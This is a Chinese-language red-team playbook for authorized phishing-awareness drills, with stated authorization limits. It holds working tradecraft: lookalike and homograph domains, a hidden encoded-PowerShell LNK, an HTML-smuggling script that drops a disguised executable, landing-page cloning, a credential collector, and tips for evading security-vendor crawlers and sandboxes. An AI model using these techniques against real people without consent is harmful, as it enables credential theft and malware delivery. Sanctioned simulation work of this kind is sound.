---
name: phishing-delivery
description: 授权红队钓鱼投递链。邮件认证（SPF/DKIM/DMARC）、发信基础设施、载荷承载（宏/LNK/HTA/ISO/OneNote）、落地页克隆、投递后追踪。仅限客户授权的员工意识演练。
tags: [phishing, social-engineering, email, delivery, redteam]
---

# 钓鱼投递链

**判定纪律**：投递成功 ≠ 打开 ≠ 点击 ≠ 提交凭据 ≠ 执行载荷。四层漏斗分别统计，只报「投递成功率」的演练是没有结论的。

## 一、先过邮件认证

现代邮件网关（M365/Google/网易企业邮）先看三样：

### 1.1 SPF

```
# DNS TXT 记录，授权哪些 IP 可以代表该域发信
v=spf1 include:_spf.example.com ip4:1.2.3.4 -all
```

你的发信 IP 必须在 SPF 里，否则 `-all` 直接拒。

### 1.2 DKIM

```
# 用私钥给邮件头签名，公钥放 DNS
selector._domainkey.example.com  TXT  "v=DKIM1; k=rsa; p=MIIBIjANBg..."
```

```bash
# 验证签名是否通过
# 收到邮件后看 Authentication-Results 头
grep -i "dkim=" /path/to/email.eml
```

### 1.3 DMARC

```
_dmarc.example.com  TXT  "v=DMARC1; p=reject; rua=mailto:dmarc@example.com"
```

`p=reject` + `p=reject` 意味着伪造 From 域必然失败。

**三条都过才谈投递。** 用 `p=none` 的域（很多中小企业）最容易打。

### 1.4 自检命令

```bash
# SPF
dig +short TXT example.com | grep spf1
# DKIM（需要知道 selector，常见 default/mail/s1/google）
dig +short TXT default._domainkey.example.com
# DMARC
dig +short TXT _dmarc.example.com
```

## 二、发信基础设施

| 方式 | 优点 | 缺点 | 适用 |
|---|---|---|---|
| 自建 SMTP（Postfix） | 完全可控 | IP 无信誉，易进垃圾箱 | 需预热 IP |
| 商业 ESP（SendGrid/Mailgun） | 送达率高 | 需企业认证，滥用会被封 | 客户提供账号 |
| 租用「钓鱼专用」服务 | 省事 | 黑产，不可用 | ❌ |
| 客户自有邮件服务器 | 送达率最高 | 需客户配合 | 内部演练首选 |

**推荐**：内部演练直接用客户自己的邮件服务器发（同域、SPF/DKIM 天然通过）。外部视角才需要独立基础设施。

### 2.1 域名相似度

```
目标：example.com
候选：examp1e.com（数字1替l）、exarnple.com（rn替m）、example-cn.com、
      example.co（换 TLD）、exampIe.com（大写I）、еxample.com（西里尔 е）
```

**IDN 同形字**（西里尔/希腊字母）浏览器地址栏看起来一样，但证书和 DNS 不同。

## 三、载荷承载形态

按「现代 Office/Windows 默认拦截情况」排序：

| 载体 | 现状 | 说明 |
|---|---|---|
| **.exe / .scr** | 几乎必拦 | 邮件网关直接删 |
| **.js / .vbs / .wsf** | 多数拦 | 部分网关仍放行 |
| **.lnk 快捷方式** | 常放行 | 指向 powershell/cmd，需绕 MOTW |
| **ISO / IMG / VHD** | 曾被大量放行 | 2022 后 M365 逐步拦 |
| **.one（OneNote）** | 曾流行 | 嵌入「双击运行」的伪按钮 |
| **宏文档 .docm/.xlsm** | 默认拦（MOTW） | 需诱导「启用内容」 |
| **HTML 走私（.html/.svg）** | 放行率高 | 内嵌 base64 载荷，浏览器侧落地 |
| **PDF 带链接** | 放行率高 | 只做凭据钓鱼，不带载荷 |
| **云盘链接（OneDrive/Google Drive）** | 放行率高 | 绕过附件扫描，靠信誉 |

### 3.1 LNK 载体要点

```
目标：C:\Windows\System32\cmd.exe
参数：/c powershell -w hidden -enc <base64>
图标：伪装成 PDF/Word 图标
```

**MOTW（Mark of the Web）**：从网络下载的文件带 Zone.Identifier，SmartScreen 会拦。绕过方式：
- ISO/IMG 挂载后的文件丢失 MOTW（历史手法，新版已修）
- 让用户手动「解除锁定」（社工话术）

### 3.2 HTML 走私

```html
<!-- 附件是 .html，双击在浏览器打开，JS 生成文件并触发下载 -->
<script>
const b64 = "TVqQAAMAAAAEAAAA...";  // PE 的 base64
const blob = new Blob([Uint8Array.from(atob(b64), c => c.charCodeAt(0))]);
const a = document.createElement('a');
a.href = URL.createObjectURL(blob);
a.download = "invoice.pdf.exe";
a.click();
</script>
```

网关只看到 HTML，不解析 JS 生成的载荷。

## 四、落地页克隆

### 4.1 克隆方式

```bash
# 单页克隆（保留资源）
wget --mirror --convert-links --page-requisites --no-parent -P ./clone https://login.target.com/

# 或用浏览器保存完整页面（更准确，含 JS 渲染后的 DOM）
# Playwright：page.content() 落盘
```

**必须改的**：
- 表单 `action` 指向你的收集端
- 去掉原站的 CSRF token（否则提交失败）
- 去掉统计/监控脚本（会向原站发请求，暴露克隆页）

### 4.2 凭据收集端

```python
# 最小实现：只记字段名 + 时间 + IP 段，不存明文密码
from http.server import BaseHTTPRequestHandler, HTTPServer

class H(BaseHTTPRequestHandler):
    def do_POST(self):
        n = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(n).decode('utf-8', 'ignore')
        # 只记录「哪些字段被填写」，值打码
        fields = [p.split('=')[0] for p in body.split('&')]
        open('hits.log', 'a').write(f"{self.client_address[0][:9]}*** {fields}\n")
        self.send_response(302)
        self.send_header('Location', 'https://login.target.com/')  # 跳回真站
        self.end_headers()

HTTPServer(('0.0.0.0', 443), H).serve_forever()
```

**红线**：MFA 场景下不做事中继（real-time phishing proxy），除非合同明确授权且客户知情——它等于直接接管账号。

### 4.3 反检测

| 检测点 | 缓解 |
|---|---|
| URL 信誉 | 新域名先养（挂正常页面 2–4 周） |
| 证书 | Let's Encrypt，不要自签 |
| 页面指纹 | 完整克隆，别只截个图 |
| 安全厂商爬虫 | 按 UA/IP 段屏蔽（但注意别屏蔽真实用户） |
| 沙箱访问 | 检测无头浏览器特征，返回正常页面 |

## 五、投递链路追踪

每一层都要能统计：

```
发送 N 封 → 送达 N1（退信率）→ 打开 N2（像素/链接）→ 点击 N3 → 提交 N4 → 执行 N5
```

**像素追踪**：正文嵌 1x1 图，加载即记录。
**链接追踪**：每个收件人独立 token（`?id=abc123`），点哪个链接、什么时间，全可查。

**注意**：追踪像素/链接会被邮件安全网关的「链接沙箱预取」误触发，导致打开率虚高。区分方法：对比「点击时间」与「发送时间」的间隔——秒级是沙箱，分钟级以上是人。

## 六、演练设计（授权前提）

```markdown
1. 目标人群：分层（高管/财务/IT/普通员工），每层不同话术
2. 话术主题：与业务相关（发票、密码到期、共享文档、HR 通知）
3. 载荷：优先「无载荷」——只做凭据钓鱼 + 教育页
4. 合规：合同明确授权范围、时间窗、不针对个人隐私
5. 中止条件：有人真的中招并执行了载荷 → 立即停止并通知
6. 数据：只保留统计，不保留明文凭据
7. 复盘：给中招者单独培训，不公开点名
```

## 七、常见误判

| 现象 | 真实原因 |
|---|---|
| 「送达率 0」 | SPF/DKIM/DMARC 没过，或 IP 在黑名单 |
| 「打开率 80%」 | 网关沙箱预取了链接 |
| 「没人点击所以员工意识好」 | 邮件进了垃圾箱，根本没看到 |
| 「用了相似域名就成功」 | 新域名信誉低，网关直接拦 |
| 「附件被拦所以失败了」 | 换载体（链接/云盘）往往能过 |

## 八、红线

- 仅限客户书面授权的员工意识演练
- 不收集明文密码；不接管真实账号
- 不针对个人隐私、不用于骚扰
- 演练结束 24 小时内提供完整报告 + 清理所有收集端
- 不向第三方出售/复用演练数据
